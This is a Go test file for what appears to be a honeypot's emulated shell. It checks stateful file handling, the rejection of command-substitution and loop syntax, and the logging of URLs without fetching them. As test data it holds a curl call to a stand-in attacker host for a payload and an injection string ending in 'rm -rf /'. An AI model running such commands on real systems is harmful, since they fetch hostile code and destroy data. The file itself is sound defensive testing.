package emulator

import (
	"github.com/ksahoo/fyke/internal/persona"
	"strings"
	"testing"
)

func testPersona() persona.Persona {
	return persona.Persona{ID: "p", Host: persona.Host{Hostname: "edge", Kernel: "6.1"}, Users: []persona.User{{Name: "deploy", UID: 1001, Home: "/home/deploy"}}, Files: map[string]persona.File{"/home/deploy/a.txt": {Content: "safe\n", Mode: 0444}}}
}
func TestShellIsStatefulAndBoundsControlSyntax(t *testing.T) {
	s := NewShell(testPersona(), "deploy")
	if got := s.Run("cat a.txt").Output; got != "safe\r\n" {
		t.Fatalf("cat=%q", got)
	}
	s.Run("touch note")
	if got := s.Run("ls").Output; !strings.Contains(got, "note") {
		t.Fatalf("overlay absent: %q", got)
	}
	if got := s.Run("echo hello | grep ell && echo ok > note2; cat note2").Output; got != "hello\r\nok\r\n" {
		t.Fatalf("bounded grammar=%q", got)
	}
	for _, input := range []string{"$(uname)", "`id`", "echo x & sleep 1", "for x in a; do echo $x; done"} {
		if !s.Run(input).Unsupported {
			t.Errorf("control syntax accepted: %q", input)
		}
	}
}
func TestShellRecordsURLWithoutFetching(t *testing.T) {
	s := NewShell(testPersona(), "deploy")
	r := s.Run("curl https://attacker.invalid/payload")
	if len(r.URLs) != 1 || r.URLs[0] != "https://attacker.invalid/payload" {
		t.Fatalf("url not recorded: %#v", r)
	}
}
func FuzzTokenize(f *testing.F) {
	f.Add("echo hello")
	f.Add("'; rm -rf /")
	f.Fuzz(func(t *testing.T, input string) { _ = NewShell(testPersona(), "deploy").Run(input) })
}
